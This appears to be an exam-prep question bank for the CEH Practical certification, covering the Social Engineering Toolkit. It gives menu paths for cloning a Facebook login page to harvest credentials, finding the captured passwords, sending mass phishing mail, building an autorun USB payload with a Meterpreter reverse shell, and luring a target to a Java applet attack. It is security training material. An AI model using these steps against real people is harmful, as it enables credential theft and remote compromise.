# Question Bank — Social Engineering (8 questions)

> Almost all of CEH Practical's social engineering questions are SET menu navigation. Steps link into the [setoolkit tool doc](../../tools/setoolkit.md) — click any step to read what it does.

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Launch the Social Engineering Toolkit on Parrot/Kali

**Category:** Tool launch | **Tools:** [setoolkit](../../tools/setoolkit.md)

**Steps:**
1. `sudo setoolkit` ← [why setoolkit](../../tools/setoolkit.md#usage)
2. Accept the terms (`y`).

**Answer format:** the main menu (`Select from the menu:`) appears.

**Gotcha:** SET needs root (raw sockets + port 80 bind). `sudo` is mandatory.

---

### Q2 🟢 — What is the SET menu path for the Credential Harvester Attack?

**Category:** Menu navigation | **Tools:** [setoolkit](../../tools/setoolkit.md)

**Steps:**
1. `sudo setoolkit`
2. `1` — Social-Engineering Attacks
3. `2` — Website Attack Vectors
4. `3` — Credential Harvester Attack Method
5. `2` — Site Cloner

**Answer format:** menu sequence `1 → 2 → 3 → 2`

**Gotcha:** CEH frequently asks for the literal menu numbers. Memorise this exact path.

---

### Q3 🟢 — Clone `https://www.facebook.com` with the SET credential harvester

**Category:** Phishing site | **Tools:** [setoolkit](../../tools/setoolkit.md)

**Steps:**
1. `sudo setoolkit` → `1 → 2 → 3 → 2` ← [why this path](../../tools/setoolkit.md#credential-harvester)
2. `IP address for the POST back in Harvester/Tabnabbing` → your attacker IP (e.g. `10.10.10.100`).
3. `Enter the url to clone` → `https://www.facebook.com`
4. SET starts an Apache-less listener on port 80.

**Answer format:** URL/IP of the cloned login page (e.g. `http://10.10.10.100`)

**Gotcha:** if port 80 is busy (`Address already in use`), stop Apache: `sudo systemctl stop apache2`.

---

### Q4 🟢 — Where does SET save captured credentials from the harvester?

**Category:** Evidence recovery | **Tools:** [setoolkit](../../tools/setoolkit.md)

**Steps:**
1. Credentials print live to the SET terminal as `PARAM: username=... PASSWD=...`.
2. Persisted XML report: `/root/.set/reports/` (filename starts with `<date>`).
3. Or: `ls -lt /root/.set/reports/ | head`

**Answer format:** path (e.g. `/root/.set/reports/2024-01-15_10-22-33.xml`) or the harvested `user:pass`

**Gotcha:** `.set` is a hidden dir under the account you ran SET as (root if you used `sudo`).

---

### Q5 🟡 — Run a mass-mailer phishing attack from SET

**Category:** Mass mail | **Tools:** [setoolkit](../../tools/setoolkit.md)

**Steps:**
1. `sudo setoolkit` → `1` Social-Engineering Attacks → `5` Mass Mailer Attack.
2. Pick `1` (single email) or `2` (mass via file).
3. Supply sender, subject, body, and target list.
4. SET uses a local sendmail / Gmail SMTP depending on config.

**Answer format:** menu path `1 → 5 → 1` (or `2` for mass).

**Gotcha:** on the exam Gmail SMTP will fail (no internet) — use a local sendmail relay or simulate only.

---

### Q6 🟡 — Create an infectious media (USB) payload via SET

**Category:** USB payload | **Tools:** [setoolkit](../../tools/setoolkit.md)

**Steps:**
1. `sudo setoolkit` → `1` Social-Engineering Attacks → `3` Infectious Media Generator.
2. Choose `2` Standard Metasploit Executable.
3. Pick a payload (e.g. `windows/meterpreter/reverse_tcp`).
4. Set LHOST/LPORT → SET writes `autorun.inf` + `payload.exe` to `~/.set/`.

**Answer format:** path to the generated payload (`/root/.set/autorun/`)

**Gotcha:** `autorun.inf` only auto-executes on very old Windows (pre-Win7 patched). On modern Windows this is a manual-click lure.

---

### Q7 🟡 — Host a Java applet attack via SET against 10.10.10.5

**Category:** Browser exploit | **Tools:** [setoolkit](../../tools/setoolkit.md)

**Steps:**
1. `sudo setoolkit` → `1 → 2` Website Attack Vectors → `1` Java Applet Attack Method.
2. `2` Site Cloner → supply attacker IP + URL to clone.
3. Pick a Metasploit payload (`windows/meterpreter/reverse_tcp`).
4. Trick target into visiting `http://10.10.10.100/`.

**Answer format:** menu path `1 → 2 → 1 → 2`

**Gotcha:** modern browsers block Java applets entirely — this attack is historical but still tested on CEH.

---

### Q8 🔴 — Identify the SET config file and change the default web server port from 80 to 8080

**Category:** SET configuration | **Tools:** [setoolkit](../../tools/setoolkit.md)

**Steps:**
1. Edit: `/etc/setoolkit/set.config` (or `/usr/share/set/config/set_config`).
2. Change `WEB_PORT=80` → `WEB_PORT=8080`.
3. Relaunch: `sudo setoolkit`.

**Answer format:** the config key/line changed (e.g. `WEB_PORT=8080`)

**Gotcha:** SET's menu doesn't re-read config mid-session — always restart after editing.

---

## 📌 Quick links

- [setoolkit full reference](../../tools/setoolkit.md)
- [Social engineering playbook](../../playbooks/social-engineering-playbook.md)
- [08-social-engineering README](../../08-social-engineering/README.md)
